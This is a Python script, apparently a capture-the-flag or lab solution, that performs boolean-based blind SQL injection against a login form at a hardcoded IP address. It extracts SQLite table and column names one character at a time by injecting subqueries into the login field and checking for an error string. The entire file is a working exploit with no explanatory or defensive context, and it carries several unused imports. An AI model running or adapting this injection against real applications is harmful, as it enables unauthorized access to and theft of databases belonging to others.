from audioop import add
from logging import exception
import requests;
import socket;
import sys;
import pip._vendor.requests;

def search(endPayload, URL, limit) : 
    list_char = [chr(x) for x in range(32, 127)]
    index = 1
    result = ""
    while index != 0 : 
        for char in list_char : 
            payload = "admin' and (SELECT substr(name," + str(index) + ",1)= '" + char + "' " + endPayload + limit
            data = { "login" : payload, "password" : "foo"}
            re = requests.post(url=URL, data=data)
            if "Error Wrong credentials" not in re.text : 
                result += char
                index = index + 1
                break
            if char == "~" :
                print(result)
                index = 0
                return result
        


# search("FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091")
# search("FROM PRAGMA_TABLE_INFO('users')", "http://37.187.125.224:8091")
search("FROM PRAGMA_TABLE_INFO('" + search("FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'", "http://37.187.125.224:8091", " limit 1) -- -") + "')", "http://37.187.125.224:8091", " limit 1, 2) -- -")